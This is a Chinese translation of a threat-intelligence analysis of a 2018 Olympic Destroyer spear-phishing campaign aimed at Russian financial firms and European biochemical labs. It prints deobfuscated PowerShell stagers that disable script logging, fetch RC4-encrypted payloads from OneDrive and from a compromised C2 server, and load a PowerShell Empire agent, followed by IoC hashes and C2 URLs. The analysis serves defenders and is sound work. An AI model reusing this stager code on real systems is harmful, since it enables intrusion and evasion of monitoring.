> 原文链接: https://www.anquanke.com//post/id/148746 


# 重出江湖：对Olympic Destroyer最新变种的分析


                                阅读量   
                                **86745**
                            
                        |
                        
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者，文章来源：
                                <br>原文地址：[https://securelist.com/olympic-destroyer-is-still-alive/86169/](https://securelist.com/olympic-destroyer-is-still-alive/86169/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01f6fd67f9d743224a.jpg)](https://p1.ssl.qhimg.com/t01f6fd67f9d743224a.jpg)

## 一、前言

2018年3月，我们发表了关于Olympic Destroyer的相关[研究结果](https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/)，这个攻击组织的目标是2018年韩国平昌冬奥会的主办方、供应商以及合作伙伴。Olympic Destroyer是借助破坏型网络蠕虫传播的网络破坏攻击威胁。在大肆破坏之前，攻击者会先渗透目标网络进行侦察，选择最合适的跳板，实现恶意软件的自我复制以及自我修改。

前面我们强调过一点，Olympic Destroyer与其他攻击活动有所不同，整个攻击活动充斥着各种欺骗操作。尽管如此，攻击者仍然犯下了严重的失误，这也让我们发现并证实攻击者伪造各种痕迹以误导研究人员对其的追踪溯源。Olympic Destroyer背后的攻击者伪造了自动生成的特征数据（即Rich Header），诱导人们认为恶意软件为Lazarus APT组织的产物（拉撒路组织，与朝鲜有关的一个APT组织）。如果大家对之前背景不甚了解，可以看一下这篇[文章](https://securelist.com/the-devils-in-the-rich-header/84348/)，其中专门分析了攻击者的信息伪造手段。

Olympic Destroyer使用了各种欺骗行为以及各种虚假特征，成功误导了信息安全行业的许多研究人员，也引起了我们的关注。根据恶意软件的相似性，其他研究人员将Olympic Destroyer恶意软件与三个中国的APT组织以及朝鲜的Lazarus APT组织关联在一起；恶意软件的某些代码包含EternalRomance漏洞利用特征，而其他代码则与Netya（[Expetr/NotPetya](https://securelist.com/schroedingers-petya/78870/) ）以及[BadRabbit](https://securelist.com/bad-rabbit-ransomware/82851/)勒索软件相关。卡巴斯基实验室成功找到了横向渗透工具以及最初感染的后门，并且跟踪到了与韩国受害者有关的Olympic Destroyer的基础设施。

Olympic Destroyer所使用的某些TTPs以及安全特性与[Sofacy APT组织](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)的攻击活动有一定的相似性。在虚假特征方面，伪造TTPs远比技术上篡改特征要困难得多。这意味着攻击者在行为模仿以及新TTPs适应方面有极其深刻的理解。然而，我们需要记住一点，Olympic Destroyer是使用虚假特征的大师，因此对于这种关联性我们也没有十足的把握。

我们决定进一步跟踪这个组织，设置虚拟“网络”，在Olympic Destroyer再次使用类似武器时捕获相关样本。让我们惊讶的是，最近Olympic Destroyer又开始了新的攻击活动。

2018年5月至6月期间，我们发现了新的鱼叉式钓鱼文档，这些文档与Olympic Destroyer之前使用的武器化文档非常相似。根据这个线索以及其他TTPs，我们认为这个攻击组织又重现江湖。

然而，这次攻击者的目标有所不同。根据我们的感知数据以及对鱼叉式钓鱼文档特征的分析结果，我们认为Olympic Destroyer现在针对的是俄罗斯境内的金融机构以及欧洲、乌克兰境内的生物及化学威胁预防实验室。攻击者继续使用了非二进制的可执行感染方式以及经过混淆的脚本来躲避安全产品的检测机制。

[![](https://p4.ssl.qhimg.com/t01dc6a13a7c1cbff8b.png)](https://p4.ssl.qhimg.com/t01dc6a13a7c1cbff8b.png)

图1. 简化版的感染过程



## 二、感染过程分析

感染过程实际上比图1复杂，用到了各种不同的技术，将VBA代码、Powershell、MS HTA以及JScript混淆使用。我们可以仔细分析一下，以便事件响应人员以及安全研究人员能够随时识别此类攻击行为。

我们最近捕获的某个文档包含如下属性：

```
MD5: 0e7b32d23fbd6d62a593c234bafa2311
SHA1: ff59cb2b4a198d1e6438e020bb11602bd7d2510d
File类型: Microsoft Office Word
上一次保存日期: 2018-05-14 15:32:17 (GMT)
已知文件名: Spiez CONVERGENCE.doc
```

内嵌的宏经过高度混淆处理，包含随机生成的变量以及函数名。

[![](https://p3.ssl.qhimg.com/t016099c41b57918114.png)](https://p3.ssl.qhimg.com/t016099c41b57918114.png)

图2. 经过混淆的VBA宏

其功能是执行Powershell命令。这段VBA代码的混淆技术与原始的Olympic Destoryer所使用的鱼叉式钓鱼攻击技术相同。

样本通过命令行启动了一个新的经过混淆的Powershell scriptlet。混淆器使用了基于数组重排的技术来修改原始代码，并且对命令及控制（C2）服务器地址等所有命令及字符串做了保护处理。

有一款工具可以得到类似的效果：Invoke-Obfuscation 。

[![](https://p2.ssl.qhimg.com/t018772040f11eba205.png)](https://p2.ssl.qhimg.com/t018772040f11eba205.png)

图3. 经过混淆处理的Powershell scriptlet

这个脚本禁用了Powershell脚本日志功能以避免留下痕迹：

```
IF($`{`GPc`}`[ScriptBlockLogging])
`{`
    $`{`Gpc`}`[ScriptBlockLogging][EnableScriptBlockLogging]=0;
    $`{`gpc`}`[ScriptBlockLogging][EnableScriptBlockInvocationLogging]=0
`}`
```

脚本中内置了Powershell中RC4算法的具体实现，用来解密从微软OneDrive上下载的其他载荷。解密过程需要用到一个硬编码的32字节ASCII十六进制密钥。这一点与之前Olympic Destroyer鱼叉式钓鱼文档所使用的技术相似，也与在Olympic Destroyer的基础设施中发现的Powershell后门相似。

```
$`{`k`}`=  (  .VARiabLE Bqvm  ).vAlUE::“aSCiI”.GETBYtes.Invoke(d209233c7d7d7acee5aa0e8b0889bb1e);
$`{`R`}`=`{`
$`{`D`}`,$`{`K`}`=$`{`aRGS`}`;
$`{`s`}`=0..255;0..255^|^&amp;(‘%’)`{`
    $`{`J`}`=($`{`j`}`+$`{`S`}`[$`{`_`}`]+$`{`K`}`[$`{`_`}`%$`{`k`}`.“coUNt”])%256;
    $`{`S`}`[$`{`_`}`],$`{`S`}`[$`{`j`}`]=$`{`S`}`[$`{`J`}`],$`{`S`}`[$`{`_`}`]
`}`;
$`{`d`}`^|^&amp;(‘%’)`{`
    $`{`i`}`=($`{`i`}`+1)%256;
    $`{`h`}`=($`{`h`}`+$`{`s`}`[$`{`I`}`])%256;
    $`{`S`}`[$`{`i`}`],$`{`S`}`[$`{`h`}`]=$`{`s`}`[$`{`h`}`],$`{`s`}`[$`{`I`}`];
    $`{`_`}`–Bxor$`{`S`}`[($`{`S`}`[$`{`I`}`]+$`{`s`}`[$`{`h`}`])%256]
`}``}`;
$`{`daTa`}`=$`{`wc`}`.DOWNloADDatA.Invoke(https://api.onedrive[.]com/v1.0/shares/s!ArI-XSG7nP5zbTpZANb3-dz_oU8/driveitem/content);
$`{`IV`}`=$`{`dATa`}`[0..3];
$`{`dATa`}`=$`{`dATA`}`[4..$`{`dAta`}`.“LENgtH”];
–JoIn[CHar[]](^&amp; $`{`r`}` $`{`daTa`}` ($`{`iV`}`+$`{`k`}`))
```

样本所下载的第二阶段载荷是一个HTA文件，该文件同样会执行一个Powershell脚本。

[![](https://p2.ssl.qhimg.com/t011a85204835f5e268.png)](https://p2.ssl.qhimg.com/t011a85204835f5e268.png)

图4. 下载的access.log.txt文件

这个文件与鱼叉式钓鱼文档宏所执行的Powershell脚本采用相似的结构。经过去混淆处理后，我们可以看到这个脚本同样会禁用掉Powershell日志记录功能，然后从同一个服务器地址下载下一阶段载荷。该文件同样使用了带有预定义密钥的RC4算法：

```
$`{`k`}`=  (  Get-vaRiablE  R4Imz  -VAl  )::”aSCIi”.GEtBytEs.Invoke(d209233c7d7d7acee5aa0e8b0889bb1e);
$`{`r`}`=`{`$`{`D`}`,$`{`K`}`=$`{`ARGs`}`;
$`{`s`}`=0..255;
0..255^|.(‘%’)`{`$`{`j`}`=($`{`j`}`+$`{`S`}`[$`{`_`}`]+$`{`k`}`[$`{`_`}`%$`{`K`}`.”COUNT”])%256;
$`{`S`}`[$`{`_`}`],$`{`s`}`[$`{`J`}`]=$`{`s`}`[$`{`j`}`],$`{`s`}`[$`{`_`}`]`}`;
$`{`d`}`^|.(‘%’)`{`$`{`I`}`=($`{`I`}`+1)%256;
$`{`h`}`=($`{`h`}`+$`{`S`}`[$`{`I`}`])%256;
$`{`s`}`[$`{`I`}`],$`{`S`}`[$`{`H`}`]=$`{`s`}`[$`{`h`}`],$`{`s`}`[$`{`i`}`];
$`{`_`}`-BxOR$`{`s`}`[($`{`s`}`[$`{`i`}`]+$`{`S`}`[$`{`h`}`])%256]`}``}`;
$`{`wC`}`.”HeaDErS”.Add.Invoke(Cookie,session=B43mgpQ4No69GDp3PmklQpTZB5Q=);
$`{`SeR`}`=https://mysent[.]org:443;
$`{`t`}`=/modules/admin.php;
$`{`dATA`}`=$`{`wc`}`.DOWNLOAdDaTA.Invoke($`{`SeR`}`+$`{`t`}`);
$`{`iV`}`=$`{`DATA`}`[0..3];
$`{`DATA`}`=$`{`dATA`}`[4..$`{`dAta`}`.”LeNGTh”];
-JoiN[ChAR[]](^&amp; $`{`R`}` $`{`daTa`}` ($`{`IV`}`+$`{`k`}`))
```

最后一个载荷为Powershell Empire agent。如下部分代码中，样本通过http stager scriptlet来下载Empire agent。

```
$wc.HeAders.Add(“User-Agent”,$UA);
 $raw = $wc.UploadData($s + “/modules/admin.php”,”POST”,$rc4p2);
 Invoke-Expression $($e.GetSTRiNG($(DecrYPT-BYtEs -KeY $kEy -In $raW)));
 $AES = $NuLl;
 …
 [GC]::COLLEcT(); 
 Invoke-Empire -Servers @(($s -split “/”)[0..2] -join “/”) -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours “WORKING_HOURS_REPLACE” -KillDate “REPLACE_KILLDATE” -ProxySettings $Script:Proxy; `}`
```

Powershell Empire是使用Python以及Powershell编写的后渗透开源框架，可以以无文件方式来控制被突破的主机，采用模块化体系结构，使用了加密通信方式。渗透测试公司在横向渗透以及信息收集等合法安全测试工作中广泛用到了这个框架。



## 三、基础设施

我们认为攻击者使用了被攻破的合法web服务器来托管并控制恶意软件。根据分析结果，我们发现的C2服务器所涉及到的URI路径包含以下特征：

```
/components/com_tags/views
/components/com_tags/views/admin
/components/com_tags/controllers
/components/com_finder/helpers
/components/com_finder/views/
/components/com_j2xml/
/components/com_contact/controllers/
```

这些路径为非常流行的开源内容管理系统（CMS）Joomla所使用的目录结构：

[![](https://p1.ssl.qhimg.com/t01ee6a10e2c4707c6c.png)](https://p1.ssl.qhimg.com/t01ee6a10e2c4707c6c.png)

图5. Github上的Joomla组件路径

不幸的是，我们并不知道攻击者具体利用了Joomla CMS中的哪个漏洞。我们所知的是托管载荷的某个服务器所使用的是Joomla v1.7.3版，这个版本相当老，发布于2011年11月份。

[![](https://p2.ssl.qhimg.com/t0185bd99872b2aaee5.png)](https://p2.ssl.qhimg.com/t0185bd99872b2aaee5.png)

图6. 被攻破的服务器使用了Joomla



## 四、受害者及目标

根据多个目标情况以及有限的几份受害者报告，我们认为Olympic Destroyer最近的攻击目标为俄罗斯、乌克兰以及其他几个欧洲国家。根据我们的感知数据，有一些受害者来自于俄罗斯的金融部门。此外，我们发现的所有样本几乎都上传到了欧洲国家的多平台扫描服务（如荷兰、德国、法国、乌克兰以及俄罗斯）。

[![](https://p4.ssl.qhimg.com/t011ecfd2718e73d818.png)](https://p4.ssl.qhimg.com/t011ecfd2718e73d818.png)

图7. Olympic Destroyer近期攻击活动的目标位置

我们毕竟无法观测到所有数据，因此我们只能根据已知的钓鱼文档的内容、电子邮件的主题或者攻击者精心挑选的文件名等配置信息来推测攻击者的潜在目标。

有个钓鱼文档引起了我们的注意，这个文档提到了“Spiez Convergence ”，这是在瑞士举办的一个生物化学威胁研究会议，由[SPIEZ LABORATORY](https://www.labor-spiez.ch/en/lab/)组织，而后者不久前刚参与了索尔兹伯里袭击事件的[调查](https://www.theguardian.com/uk-news/2018/apr/15/salisbury-attack-russia-claims-chemical-weapons-watchdog-manipulated-findings)。

[![](https://p1.ssl.qhimg.com/t010dbdc69e0465d0c0.png)](https://p1.ssl.qhimg.com/t010dbdc69e0465d0c0.png)

图8. 采用Spiez Convergence话题的钓鱼文档

我们在攻击活动中观察到的另一个钓鱼文档（“Investigation_file.doc ”）提到了索尔兹伯里事件中用来毒害Sergey Skripal和他女儿的神经毒剂：

[![](https://p0.ssl.qhimg.com/t01675e45b59176116b.png)](https://p0.ssl.qhimg.com/t01675e45b59176116b.png)

图9. 另一份钓鱼文档

其他一些渔叉式钓鱼文档的文件名中还包含俄文以及德文文字：

```
9bc365a16c63f25dfddcbe11da042974    Korporativ.doc
da93e6651c5ba3e3e96f4ae2dd763d94    Korporativ_2018.doc
e2e102291d259f054625cc85318b7ef5    E-Mail-Adressliste_2018.doc
```

其中一个文档还包含一张诱骗图片，图片中的俄文非常准确。

[![](https://p1.ssl.qhimg.com/t01e67c3339e2c4e9a0.png)](https://p1.ssl.qhimg.com/t01e67c3339e2c4e9a0.png)

图10. 诱导用户启用宏的俄文描述（54b06b05b6b92a8f2ff02fdf47baad0e）

最新的一份武器化文档来自于乌克兰，被上传到了一个恶意软件扫描服务商，名为“nakaz.zip”，其中包含一个“nakaz.doc”文档（乌克兰语翻译过来就是“order.doc”）。

[![](https://p4.ssl.qhimg.com/t013876f87b39721ed1.png)](https://p4.ssl.qhimg.com/t013876f87b39721ed1.png)

图11. 诱导用户启用宏的另一段描述文字

根据文档元数据信息，该文档的编辑时间为6月14日。该文档以及上一个文档中包含的西里尔文都是非常准确的俄文，表明文档可能在相关母语人士的帮助下编写，而不是借助于翻译软件。

一旦用户启用宏，样本就会向用户展示一个欺诈文件，该文件来自于乌克兰政府机构，时间非常新（文档中的日期为2018年6月11日）。文档的内容与乌克兰卫生部[官网](http://moz.gov.ua/article/ministry-mandates/nakaz-moz-ukraini-vid-11062018--1103-pro-vnesennja-zmin-do-rozpodilu-likarskih-zasobiv-dlja-hvorih-u-do--ta-pisljaoperacijnij-period-z-transplantacii-zakuplenih-za-koshti-derzhavnogo-bjudzhetu-ukraini-na-2016-rik)上的内容相同。

[![](https://p2.ssl.qhimg.com/t01d1e1b373d4a6d68b.png)](https://p2.ssl.qhimg.com/t01d1e1b373d4a6d68b.png)

图12. nakaz.doc中的欺诈文字

进一步分析其他相关文件后，我们发现该文档的目标为从事生物及流行病威胁预防领域的相关目标。



## 五、追踪溯源

虽然我们的分析并不全面，但还是发现了一些线索，可以将此次攻击活动与之前的Olympic Destroyer攻击活动更好地关联在一起。卡巴斯基态势报告服务的订阅客户可以了解与Olympic Destroyer攻击活动有关的更多信息（如下图所示）。

[![](https://p4.ssl.qhimg.com/t01d8c77feb101cc0f2.png)](https://p4.ssl.qhimg.com/t01d8c77feb101cc0f2.png)

图13. 与Olympic Destroyer采用相似的经过混淆处理的宏结构

如上图所示，该样本与Olympic Destroyer相关样本看起来结构上非常相似，似乎采用同一个工具以及混淆器来生成攻击载荷。在新一波攻击活动中，上图高亮标注的函数名实际并不新颖，虽然这个名字（“MultiPage1_Layout ”）并不常见，但我们可以在Olympic Destroyer的钓鱼文档（MD5: 5ba7ec869c7157efc1e52f5157705867）中找到这个名称。

[![](https://p2.ssl.qhimg.com/t01bad4ad8205c69803.png)](https://p2.ssl.qhimg.com/t01bad4ad8205c69803.png)

图14. 之前攻击活动中同样用到了MultiPage1_Layout这个函数名



## 六、总结

尽管之前有人认为Olympic Destroyer的活跃程度应该会保持在较低水平，甚至有可能不再活跃，但现在我们又可以在针对欧洲、俄罗斯和乌克兰的新一波攻击活动中看到它的身影。在2017年底，紧跟在类似侦察行为后的是对大型网络的破坏活动，意图破坏和致瘫冬奥会的基础设施以及相关供应链、合作伙伴甚至是会场场地。目前我们可能已经观察到了这个侦察阶段，接下来可能伴随着带有新动机的一系列破坏攻击行为。因此欧洲的所有生物化学威胁预防以及研究攻击和组织都必须加强安全等级，不定期开展安全审计，这一点非常重要。

此次攻击活动中还牵扯到各种各样的金融以及非金融目标，这表明可能不同的利益团体使用了同一款恶意软件：比如某个团体主要通过网络窃取活动获取经济利益，而另一个团体希望通过目标间谍活动获取经济利益。这种行为可能是因为网络攻击任务外包所带来的结果，在国家级别的攻击活动中这种情况并不罕见。另一方面，针对金融目标的攻击行为很有可能是另一个虚假特征，攻击平昌冬奥会的攻击者很擅长故弄玄虚，用来误导研究人员的研究方向。

我们可以根据此次攻击活动的动机以及目标选择来得出一些结论，但如果在只有一些支离破碎线索的情况下，想找到谁是幕后黑手时研究人员很容易犯错误。今年年初出现的Olympic Destroyer伴随着各种复杂的欺骗行为，大大改变了追踪溯源这个过程。我们认为，如果根据常规调查所得到的追踪溯源特征，我们不可能得到准确的结论。想要防御并阻止Olympic Destroyer之类的威胁需要私营企业与各国政府的合作，不幸的是，现在全球地缘政治局势只会让互联网更加分化，给研究人员以及调查人员带来许多障碍。这种情况将导致APT攻击者继续渗透外国政府以及商业公司的私密网络。

作为研究人员，我们能尽力做的就是继续跟踪此类威胁。我们将继续监视Olympic Destroyer，公布该组织的最新活动。



## 七、IoC

**文件哈希值**

```
9bc365a16c63f25dfddcbe11da042974    Korporativ .doc
da93e6651c5ba3e3e96f4ae2dd763d94    Korporativ_2018.doc
6ccd8133f250d4babefbd66b898739b9    corporativ_2018.doc
abe771f280cdea6e7eaf19a26b1a9488    Scan-2018-03-13.doc.bin
b60da65b8d3627a89481efb23d59713a    Corporativ_2018.doc
b94bdb63f0703d32c20f4b2e5500dbbe
bb5e8733a940fedfb1ef6b0e0ec3635c    recommandation.doc
97ddc336d7d92b7db17d098ec2ee6092    recommandation.doc
1d0cf431e623b21aeae8f2b8414d2a73    Investigation_file.doc
0e7b32d23fbd6d62a593c234bafa2311    Spiez CONVERGENCE.doc
e2e102291d259f054625cc85318b7ef5    E-Mail-Adressliste_2018.doc
0c6ddc3a722b865cc2d1185e27cef9b8
54b06b05b6b92a8f2ff02fdf47baad0e
4247901eca6d87f5f3af7df8249ea825 nakaz.doc
```

**域名及IP地址**

```
79.142.76[.]40:80/news.php
79.142.76[.]40:8989/login/process.php
79.142.76[.]40:8989/admin/get.php
159.148.186[.]116:80/admin/get.php
159.148.186[.]116:80/login/process.php
159.148.186[.]116:80/news.php
ppgca.ufob.edu[.]br/components/com_finder/helpers/access.log
ppgca.ufob.edu[.]br/components/com_finder/views/default.php
narpaninew.linuxuatwebspiders[.]com/components/com_j2xml/error.log
narpaninew.linuxuatwebspiders[.]com/components/com_contact/controllers/main.php
mysent[.]org/access.log.txt
mysent[.]org/modules/admin.php
5.133.12[.]224:333/admin/get.php
```

审核人：yiwang   编辑：边边
